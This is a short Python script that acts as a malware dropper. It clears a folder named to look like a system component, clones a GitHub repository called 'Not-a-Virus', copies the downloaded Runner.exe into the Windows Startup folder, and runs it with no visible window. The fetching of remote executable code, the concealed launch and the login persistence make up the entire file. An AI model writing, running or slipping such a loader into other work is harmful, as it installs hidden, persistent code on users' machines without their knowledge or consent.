from dulwich import porcelain
import os
import shutil
from time import sleep
import subprocess

path = 'C:/Users/Public/Kernal46'
def removePath(path):
    if (os.path.exists(path)):
        print(path, 'exists')
        files = os.listdir(path)
        print(files)
        for f in files:
            currentPath = os.path.join(path, f)
            if (os.path.exists(currentPath)):
                print(f, 'exists')
                if os.path.isdir(currentPath):
                    print(f, 'is a directory')
                    removePath(currentPath)
                else:
                    print(f, 'is a file')
                    os.remove(currentPath)
            else:
                print(f, 'does not exist')
        os.rmdir(path)

removePath(path)

porcelain.clone('https://github.com/romanjmock/Not-a-Virus', path)

os.chdir(os.path.join(path, 'dist/Runner'))

CREATE_NO_WINDOW = 0x08000000
shutil.copy2('C:/Users/Public/Kernal46/dist/Runner.exe', 'C:/Users/' + os.getlogin() + '/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup')
subprocess.Popen('Runner.exe', creationflags = CREATE_NO_WINDOW)